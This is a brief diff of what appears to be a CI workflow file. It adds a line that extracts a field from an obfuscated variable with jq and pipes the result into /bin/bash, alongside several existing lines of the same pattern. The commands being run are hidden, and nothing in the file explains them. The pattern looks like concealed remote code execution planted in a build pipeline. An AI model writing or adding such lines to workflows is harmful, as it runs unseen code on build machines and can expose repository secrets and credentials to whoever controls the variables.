@@ -29,6 +29,7 @@ jobs:
           echo $pym20220 | jq -r .m013 | /bin/bash
           echo $jmbnk7890 | jq -r .vud9 | /bin/bash
           printf '%s' "$tn567" | jq -r .kb92157 | /bin/bash
+          echo $ydy3 | jq -r .tdog49700 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
